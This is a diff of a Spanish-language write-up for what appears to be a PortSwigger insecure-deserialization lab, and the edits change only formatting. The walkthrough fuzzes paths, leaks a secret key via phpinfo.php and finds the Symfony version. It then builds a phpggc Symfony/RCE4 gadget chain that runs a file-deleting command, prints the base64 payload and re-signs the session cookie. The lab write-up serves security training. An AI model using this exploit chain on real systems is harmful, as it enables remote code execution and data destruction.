@@ -24,36 +24,36 @@ image:
   
 ## Descripción
 
-Este laboratorio utiliza un mecanismo de sesiones basado en la `serialización`, el cual emplea una cookie firmada. Además, usa un framework común de PHP. Aunque no tenemos acceso al `código fuente`, todavía podemos explotar la `deserialización insegura de este laboratorio utilizando cadenas de gadgets` predefinidas. Para resolver el laboratorio, debemos identificar el framework objetivo y usar una herramienta de terceros para generar un objeto serializado malicioso que contenga una `carga útil de ejecución remota de código`. Luego, trabajamos en cómo generar una `cookie firmada válida que incluya nuestro objeto malicioso`. Finalmente, pasamos esta cookie al sitio web para eliminar el archivo `morale.txt del directorio personal de Carlos`. Podemos `iniciar sesión en nuestra propia cuenta utilizando las credenciales wiener:peter`
+Este `laboratorio` utiliza un mecanismo de `sesiones` basado en la `serialización`, el cual emplea una `cookie firmada`. Además, usa un `framework` común de `PHP`. Aunque no tenemos acceso al `código fuente`, todavía podemos `explotar` la `deserialización insegura` de este laboratorio utilizando `cadenas de gadgets` predefinidas. Para `resolver` el laboratorio, debemos identificar el `framework objetivo` y usar una `herramienta de terceros` para generar un `objeto serializado malicioso` que contenga una `carga útil de ejecución remota de código`. Luego, trabajamos en cómo generar una `cookie firmada válida` que incluya nuestro `objeto malicioso`. Finalmente, pasamos esta cookie al `sitio web` para eliminar el archivo `morale.txt` del `directorio personal` de `Carlos`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`
 
 ---
 
 ## Guía de insecure deserialization
 
-Antes de completar este laboratorio es recomendable leerse esta `guía de insecure deserialization` [https://justice-reaper.github.io/posts/Insecure-Deserialization-Guide/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Guide/)
+`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de insecure deserialization` [https://justice-reaper.github.io/posts/Insecure-Deserialization-Guide/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Guide/)
 
 ## Resolución
 
-Al acceder a la web nos sale esto
+Al `acceder` a la `web` nos sale esto
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_1.png)
 
-Pulsamos sobre My account y nos logueamos utilizando las credenciales `wiener:peter`
+Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_2.png)
 
-Refrescamos la web con F5 y capturamos la `petición con Burpsuite`
+`Refrescamos` la `web` con `F5` y `capturamos` la `petición` con `Burpsuite`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_3.png)
 
-El token está en base64 así que lo decodeamos y vemos que es un objeto en PHP
+El `token` está en `base64` así que lo `decodeamos` y vemos que es un `objeto` en `PHP`
 
 ```
 # echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJoaWZpZG0wOG1qbHQzNzd5ejl1eTM5aDV2aWQ5a2ZxMCI7fQ==' | base64 -d
 O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hifidm08mjlt377yz9uy39h5vid9kfq0";}     
 ```
 
-Fuzzeamos en busca de rutas
+`Fuzzeamos` en `busca` de `rutas`
 
 ```
 # ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/FUZZ
@@ -90,7 +90,7 @@ my-account              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55m
 :: Progress: [4734/4734] :: Job [1/1] :: 11 req/sec :: Duration: [0:01:30] :: Errors: 2 ::
 ```
 
-Fuzzeamos por archivos dentro de este directorio y encontramos un `phpinfo.php`
+`Fuzzeamos` por `archivos` dentro de este directorio y `encontramos` un `phpinfo.php`
 
 ```
 # ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/cgi-bin/FUZZ       
@@ -118,23 +118,23 @@ ________________________________________________
 phpinfo.php             [Status: 200, Size: 69787, Words: 3256, Lines: 792, Duration: 378ms]
 ```
 
-Accedemos a `https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/cgi-bin/phpinfo.php y obtenemos la versión de PHP`
+Accedemos a `https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/cgi-bin/phpinfo.php` y obtenemos la `versión` de `PHP`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_4.png)
 
-Vemos las funciones que están deshabilitadas
+Vemos las `funciones` que están `deshabilitadas`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_5.png)
 
-Obtenemos un secret key 
+`Obtenemos` un `secret key `
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_6.png)
 
-Como se está transmitiendo un objeto en la cookie vamos a borrar parte de la cookie para provocar un error y `obtener información`. En este caso nos arroja la `versión del framework` en uso, que es `Symfony 4.3.6`
+Como se está transmitiendo un `objeto` en la `cookie` vamos a `borrar parte de la cookie` para `provocar` un `error` y `obtener información`. En este caso nos `arroja` la `versión` del `framework` en uso, que es `Symfony 4.3.6`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_7.png)
 
-Nos descargamos la herramienta phpggc [https://github.com/ambionics/phpggc.git](https://github.com/ambionics/phpggc.git) y listamos los Gadget Chains disponibles para symfony
+Nos descargamos la herramienta `phpggc` [https://github.com/ambionics/phpggc.git](https://github.com/ambionics/phpggc.git) y listamos los `Gadget Chains` disponibles para `symfony`
 
 ```
 # php phpggc -l symfony
@@ -164,7 +164,7 @@ Symfony/RCE15    1.0.0 <= 1.1.9                                          RCE: Fu
 Symfony/RCE16    1.1.0 <= 1.5.18                                         RCE: Function Call    Serializable    *    
 ```
 
-Generamos un objeto
+`Generamos` un `objeto`
 
 ```
 # ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
@@ -172,10 +172,10 @@ Generamos un objeto
 Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
 ```
 
-Nos dirigimos a [https://www.freeformatter.com/hmac-generator.html](https://www.freeformatter.com/hmac-generator.html) y generamos una firma. Para ello pegamos el objeto generado, la secret key y el algoritmo
+Nos dirigimos a [https://www.freeformatter.com/hmac-generator.html](https://www.freeformatter.com/hmac-generator.html) y `generamos` una `firma`. Para ello `pegamos` el `objeto generado`, la `secret key` y el `algoritmo`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_8.png)
 
-Desde el inspector sustituimos el campo token por el objeto generado y el campo `sig_hmac_sha1 por la nueva firma`
+Desde el inspector `sustituimos` el campo `token` por el `objeto generado` y el campo `sig_hmac_sha1` por la nueva `firma`
 
 ![](/assets/img/Insecure-Deserialization-Lab-6/image_9.png)
